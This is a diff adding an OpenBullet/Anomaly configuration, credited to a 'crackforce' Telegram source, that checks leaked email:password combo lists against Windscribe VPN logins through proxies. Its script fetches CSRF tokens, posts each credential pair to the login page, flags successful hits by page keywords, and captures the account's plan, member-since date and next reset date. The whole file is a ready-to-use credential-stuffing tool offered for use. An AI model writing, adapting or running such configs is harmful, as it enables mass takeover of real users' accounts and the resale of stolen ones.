@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "Windscribe",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-07T16:02:52.7138791+02:00",
+  "AdditionalInfo": "https://t.me/crackforce",
+  "Author": "@CONFIG_COMBO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#TK REQUEST POST "https://res.windscribe.com/res/logintoken" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 0" 
+  HEADER "origin: https://windscribe.com" 
+  HEADER "referer: https://windscribe.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+#csrf_time PARSE "<SOURCE>" JSON "csrf_time" -> VAR "csrf_time" 
+
+#csrf_token PARSE "<SOURCE>" JSON "csrf_token" -> VAR "csrf_token" 
+
+REQUEST POST "https://windscribe.com/login" 
+  CONTENT "login=1&upgrade=0&csrf_time=<csrf_time>&csrf_token=<csrf_token>&username=<USER>&password=<PASS>&code=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://windscribe.com" 
+  HEADER "referer: https://windscribe.com/login" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Could not log in with provided credentials" 
+  KEYCHAIN Success OR 
+    KEY "Account Overview" 
+    KEY "Logout" 
+
+#Member_Since PARSE "<SOURCE>" LR "<h2>Member Since<a href=\"/cancel/account\" id=\"delete_account_btn\">Delete" "</" -> CAP "Member Since" 
+
+#PLAN PARSE "<SOURCE>" LR "<span id=\"ma_account_status\">" "<small" -> VAR "PLAN1" 
+
+FUNCTION Replace "<strong>" "" "<PLAN1>" -> CAP "PLAN" 
+
+#Next_Reset PARSE "<SOURCE>" REGEX "<h2>Next Reset</h2>\\s+<span>(.*?)</span>" "[1]" -> CAP "Next Reset" 
+
+FUNCTION Constant "@CONFIG_COMBO" -> CAP "Config By" 
+
